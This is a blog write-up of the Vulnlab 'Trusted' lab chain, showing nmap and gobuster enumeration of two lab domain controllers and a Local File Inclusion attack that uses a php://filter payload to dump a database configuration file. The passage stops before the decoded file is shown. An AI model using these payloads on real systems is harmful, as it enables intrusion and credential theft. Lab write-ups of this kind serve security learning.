<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Trusted - Vulnlab | Regex-33's blog</title><meta name="author" content="Youssef Achtatal"><meta name="copyright" content="Youssef Achtatal"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="This chain was relatively fun, however it&#39;s a REALLY long one. That being said I still think it was a great learning experience, as I&#39;ve learned how to perform pen-testing exploits that I&#39;ve only hear">
<meta property="og:type" content="article">
<meta property="og:title" content="Trusted - Vulnlab">
<meta property="og:url" content="http://dan-feliciano.com/2024/06/05/trusted/index.html">
<meta property="og:site_name" content="Regex-33&#39;s blog">
<meta property="og:description" content="This chain was relatively fun, however it&#39;s a REALLY long one. That being said I still think it was a great learning experience, as I&#39;ve learned how to perform pen-testing exploits that I&#39;ve only hear">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://dan-feliciano.com/images/vulnlab/trusted-vl/trusted_slide.png">
<meta property="article:published_time" content="2024-06-05T19:20:37.000Z">
<meta property="article:modified_time" content="2024-09-11T21:37:03.201Z">
<meta property="article:author" content="Youssef Achtatal">
<meta property="article:tag" content="vulnlab">
<meta property="article:tag" content="CHAIN">
<meta property="article:tag" content="Easy">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://dan-feliciano.com/images/vulnlab/trusted-vl/trusted_slide.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://dan-feliciano.com/2024/06/05/trusted/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Trusted - Vulnlab',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-09-11 17:37:03'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (false) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/cyber.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/vulnlab/"><i class="fa-fw fas fa-folder-open"></i><span> VL-Writeups</span></a></div><div class="menus_item"><a class="site-page" href="/categories/research/"><i class="fa-fw fas fa-folder-open"></i><span> Research</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url('/images/cyberpunk-red.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Regex-33's blog"><span class="site-name">Regex-33's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/vulnlab/"><i class="fa-fw fas fa-folder-open"></i><span> VL-Writeups</span></a></div><div class="menus_item"><a class="site-page" href="/categories/research/"><i class="fa-fw fas fa-folder-open"></i><span> Research</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Trusted - Vulnlab</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-06-05T19:20:37.000Z" title="Created 2024-06-05 15:20:37">2024-06-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-09-11T21:37:03.201Z" title="Updated 2024-09-11 17:37:03">2024-09-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/vulnlab/">vulnlab</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Trusted - Vulnlab"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>This chain was relatively fun, however it’s a REALLY long one. That being said I still think it was a great learning experience, as I’ve learned how to perform pen-testing exploits that I’ve only heard brief snippets about (yet never done them practically). This machine includes exploits such as Local File Inclusion and DLL Hijacking, both of which are actually commonly seen vulnerabilities if not taken into consideration properly by developers.</p>
<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><p>Running our NMAP scans for host discovery for both machines.<br><code>sudo nmap (IP) -A -oN init_scan_(1/2).txt</code><br>Also note, the IP addresses might change due to some breaks I take in between completing this chain.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 10.10.155.37</span><br><span class="line">Host is up (0.10s latency).</span><br><span class="line">Not shown: 988 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-01 15:42:14Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=trusteddc.trusted.vl</span><br><span class="line">| Not valid before: 2024-04-30T15:22:54</span><br><span class="line">|_Not valid after:  2024-10-30T15:22:54</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: TRUSTED</span><br><span class="line">|   NetBIOS_Domain_Name: TRUSTED</span><br><span class="line">|   NetBIOS_Computer_Name: TRUSTEDDC</span><br><span class="line">|   DNS_Domain_Name: trusted.vl</span><br><span class="line">|   DNS_Computer_Name: trusteddc.trusted.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2024-05-01T15:42:31+00:00</span><br><span class="line">|_ssl-date: 2024-05-01T15:42:40+00:00; +2s from scanner time.</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.94SVN%E=4%D=5/1%OT=53%CT=1%CU=41302%PV=Y%DS=2%DC=T%G=Y%TM=66326</span><br><span class="line">OS:2F1%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS</span><br><span class="line">OS:=A)SEQ(SP=FF%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=FF%GCD=1%ISR=</span><br><span class="line">OS:109%TI=RD%CI=I%II=I%TS=C)OPS(O1=M4D4NW8ST11%O2=M4D4NW8ST11%O3=M4D4NW8NNT</span><br><span class="line">OS:11%O4=M4D4NW8ST11%O5=M4D4NW8ST11%O6=M4D4ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF</span><br><span class="line">OS:%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M4D4NW8NNS%CC=Y%Q=)T</span><br><span class="line">OS:1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%</span><br><span class="line">OS:O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80</span><br><span class="line">OS:%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q</span><br><span class="line">OS:=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A</span><br><span class="line">OS:=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R</span><br><span class="line">OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: TRUSTEDDC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2024-05-01T15:42:33</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: 1s, deviation: 0s, median: 1s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 443/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   105.46 ms 10.8.0.1</span><br><span class="line">2   105.84 ms 10.10.155.37</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 169.08 seconds</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.10.155.38</span><br><span class="line">Host is up (0.10s latency).</span><br><span class="line">Not shown: 985 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)</span><br><span class="line">|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6</span><br><span class="line">| http-title: Welcome to XAMPP</span><br><span class="line">|_Requested resource was http://10.10.155.38/dashboard/</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-01 15:43:08Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)</span><br><span class="line">443/tcp  open  ssl/http      Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=localhost</span><br><span class="line">| Not valid before: 2009-11-10T23:48:47</span><br><span class="line">|_Not valid after:  2019-11-08T23:48:47</span><br><span class="line">|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">| http-title: Welcome to XAMPP</span><br><span class="line">|_Requested resource was https://10.10.155.38/dashboard/</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.5.5-10.4.24-MariaDB</span><br><span class="line">|   Thread ID: 9</span><br><span class="line">|   Capabilities flags: 63486</span><br><span class="line">|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, ODBCClient, InteractiveClient, SupportsTransactions, ConnectWithDatabase, FoundRows, SupportsLoadDataLocal, IgnoreSigpipes, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsCompression, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: n;xn=$:7D2kEU_Z&#x27;SJ[i</span><br><span class="line">|_  Auth Plugin Name: mysql_native_password</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">|_ssl-date: 2024-05-01T15:43:35+00:00; +2s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=labdc.lab.trusted.vl</span><br><span class="line">| Not valid before: 2024-04-30T15:22:56</span><br><span class="line">|_Not valid after:  2024-10-30T15:22:56</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: LAB</span><br><span class="line">|   NetBIOS_Domain_Name: LAB</span><br><span class="line">|   NetBIOS_Computer_Name: LABDC</span><br><span class="line">|   DNS_Domain_Name: lab.trusted.vl</span><br><span class="line">|   DNS_Computer_Name: labdc.lab.trusted.vl</span><br><span class="line">|   DNS_Tree_Name: trusted.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2024-05-01T15:43:26+00:00</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.94SVN%E=4%D=5/1%OT=53%CT=1%CU=41334%PV=Y%DS=2%DC=T%G=Y%TM=66326</span><br><span class="line">OS:329%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=104%TI=I%CI=I%II=I%SS=S%T</span><br><span class="line">OS:S=A)SEQ(SP=105%GCD=1%ISR=105%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=105%GCD=2%I</span><br><span class="line">OS:SR=105%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M4D4NW8ST11%O2=M4D4NW8ST11%O3=M4D</span><br><span class="line">OS:4NW8NNT11%O4=M4D4NW8ST11%O5=M4D4NW8ST11%O6=M4D4ST11)WIN(W1=FFFF%W2=FFFF%</span><br><span class="line">OS:W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M4D4NW8NNS%CC</span><br><span class="line">OS:=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=</span><br><span class="line">OS:S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF</span><br><span class="line">OS:=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=</span><br><span class="line">OS:%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=</span><br><span class="line">OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RI</span><br><span class="line">OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: LABDC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2024-05-01T15:43:29</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 1s, deviation: 0s, median: 1s</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 143/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   105.77 ms 10.8.0.1</span><br><span class="line">2   105.78 ms 10.10.155.38</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 42.35 seconds</span><br></pre></td></tr></table></figure>

<p>After our initial NMAP scan, we can see there are two devices that are up. Both have LDAP and are a part of a domain. Both of these machines seem to be domain controllers, the first being <code>trusteddc.trusted.vl</code> and the second being <code>labdc.lab.trusted.vl</code>. On the second machine, it seems that we have port 80 open, so we’ll look at that for the foothold of our attack path. Would like to note that the name of the chain is <code>Trusted</code> and we have two DCs, meaning we’ll probably have to exploit some form of domain trust or delegation between the two DCs.</p>
<p>Upon enumerating the website, we’ve seem to have found a landing page for XAMPP&#x2F;Maria DB (MySQL). Would like to note that port 3306 <code>MySQL</code> is open on this machine.<br><code>gobuster dir -u http://10.10.155.38 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/img                  (Status: 301) [Size: 334] [--&gt; http://10.10.155.38/img/]</span><br><span class="line">/dev                  (Status: 301) [Size: 334] [--&gt; http://10.10.155.38/dev/]</span><br><span class="line">/examples             (Status: 503) [Size: 401]</span><br><span class="line">/licenses             (Status: 403) [Size: 420]</span><br><span class="line">/dashboard            (Status: 301) [Size: 340] [--&gt; http://10.10.155.38/dashboard/]</span><br><span class="line">/%20                  (Status: 403) [Size: 301]</span><br><span class="line">/IMG                  (Status: 301) [Size: 334] [--&gt; http://10.10.155.38/IMG/]</span><br><span class="line">/*checkout*           (Status: 403) [Size: 301]</span><br><span class="line">/Img                  (Status: 301) [Size: 334] [--&gt; http://10.10.155.38/Img/]</span><br><span class="line">/phpmyadmin           (Status: 403) [Size: 301]</span><br><span class="line">/webalizer            (Status: 403) [Size: 301]</span><br><span class="line">/*docroot*            (Status: 403) [Size: 301]</span><br><span class="line">/*                    (Status: 403) [Size: 301]</span><br><span class="line">/con                  (Status: 403) [Size: 301]</span><br><span class="line">/Dashboard            (Status: 301) [Size: 340] [--&gt; http://10.10.155.38/Dashboard/]</span><br></pre></td></tr></table></figure>

<p>The <code>dev</code> directory seems to be relatively interesting, as I don’t commonly see these on default Apache websites. Navigating to it seems to direct us to a website titled <code>Manes Winchester Family Law Firm</code>, with directories <code>Home</code>, <code>About</code>, and <code>Contact</code>. Not only that, but it seems that we immediately see a message on the bottom of the <code>Home</code> page from one of the web developers.</p>
<p><img src="/images/vulnlab/trusted-vl/b.jpg"></p>
<p>This gives me confidence in assuming that with all we know, the attack path is some form of SQL vulnerability (could be SQL injection or by exploiting the <code>mysql_native_password</code> authentication plugin). Let’s try to look around the website some more and see if we can find any SQL vulnerabilities, I’ll enumerate a bit and see what I can find.</p>
<p>Let’s run a <code>gobuster</code> scan against <code>/dev</code> to see if we can find this database connection.<br><code>gobuster dir -u http://10.10.155.38/dev -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x &#39;php&#39;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/images               (Status: 301) [Size: 341] [--&gt; http://10.10.155.38/dev/images/]</span><br><span class="line">/Images               (Status: 301) [Size: 341] [--&gt; http://10.10.155.38/dev/Images/]</span><br><span class="line">/css                  (Status: 301) [Size: 338] [--&gt; http://10.10.155.38/dev/css/]</span><br><span class="line">/db.php               (Status: 200) [Size: 22]</span><br><span class="line">/IMAGES               (Status: 301) [Size: 341] [--&gt; http://10.10.155.38/dev/IMAGES/]</span><br><span class="line">/%20                  (Status: 403) [Size: 301]</span><br><span class="line">/*checkout*           (Status: 403) [Size: 301]</span><br><span class="line">/*checkout*.php       (Status: 403) [Size: 301]</span><br><span class="line">/CSS                  (Status: 301) [Size: 338] [--&gt; http://10.10.155.38/dev/CSS/]</span><br><span class="line">/*docroot*            (Status: 403) [Size: 301]</span><br><span class="line">/*docroot*.php        (Status: 403) [Size: 301]</span><br><span class="line">/DB.php               (Status: 200) [Size: 22]</span><br></pre></td></tr></table></figure>

<h1 id="PHP-SQLi"><a href="#PHP-SQLi" class="headerlink" title="PHP SQLi"></a>PHP SQLi</h1><p>Usually whenever you look around for SQL Injection, you’re mainly looking for a parameter to inject content into, such as <code>name</code> or <code>id</code>. This was not the case for us, as <code>db.php</code> did not have any other parameters that we can place anything into. The only result we receive from accessing <code>db.php</code> is a <code>Connection successful</code> message, however there’s pretty much nothing we can do with it.</p>
<p><img src="/images/vulnlab/trusted-vl/c.jpg"></p>
<p>That being said, there is one webpage that does have some parameter, and it seemed to be the only parameter amongst all of the webpages I could find.<br><code>http://10.10.162.38/dev/index.html?view=contact.html</code></p>
<p>This was the contact page from the landing website directory in <code>/dev</code>. Since we have a <code>?view</code> parameter, there’s an opportunity to exploit LFI.</p>
<p>To those who are not aware, LFI (Local File Inclusion) is a web-application vulnerability that allows us to traverse local files on the victim’s machine through URL or website parameters. We can then dump the contents of any file we have access to straight onto the webpage.</p>
<p>Let’s test this out on that <code>contact.html</code> page we were referring to earlier. We’ll try to access <code>C:\Users</code> to determine if we can see the list of all users we can log onto. (Remember, this is a Windows machine, otherwise on Linux we would just dump <code>/etc/passwd</code>.)<br><code>http://10.10.162.38/dev/index.html?view=C:\Users</code></p>
<p><img src="/images/vulnlab/trusted-vl/d.jpg"></p>
<p>It seems that we don’t have any permissions to view it, however we did get some vital information from this error. The local path for the website seems to be <code>C:\xampp\htdocs\dev</code>. In that case, let’s try to access that <code>db.php</code> page from here and view it’s contents.<br><code>http://10.10.162.38/dev/index.html?view=C:\xampp\htdocs\dev\db.php</code></p>
<p><img src="/images/vulnlab/trusted-vl/e.jpg"></p>
<h1 id="SQLi-PHP-Filter-Bypass"><a href="#SQLi-PHP-Filter-Bypass" class="headerlink" title="SQLi PHP Filter Bypass"></a>SQLi PHP Filter Bypass</h1><p>It seems like it works! With that in mind, we can dump all the contents from this specific file by encoding it the base64 using <code>php://filter</code>. Note that we can use a <code>php://filter</code> to query database results, in this case we are querying the contents of <strong>THIS SPECIFIC FILE</strong>. It was a bit confusing for me to understand at first, however since there is a database connection occurring from this specific file we can assume that the credentials are being matched somewhere in <code>db.php</code>‘s code.</p>
<p><code>http://10.10.162.38/dev/index.html?view=php://filter/convert.base64-encode/resource=C:/xampp/htdocs/dev/db.php</code><br>So to recap, we’re doing the following in this URL:</p>
<ol>
<li>Use the view parameter to start the LFI statement.</li>
<li>Use a PHP filter to convert all contents that we dump to base64.</li>
<li>Using the parameter <code>resource</code> to say that we want to dump all contents of <code>db.php</code> to base64.</li>
</ol>
<p><img src="/images/vulnlab/trusted-vl/f.jpg"></p>
<p>Looks as though the contents were dumped to the website, meaning we can decode this and see the real contents of <code>db.php</code>.<br><code>PD9waHAgDQokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkI[...snip...]Y29ubmVjdF9lcnJvcigpKTsNCn0NCmVjaG8gIkNvbm5lY3RlZCBzdWNjZXNzZnVsbHkiOw0KPz4=</code></p>
<p>From here, it’s just a simple base64 decode in our terminal to find out the contents.</p>
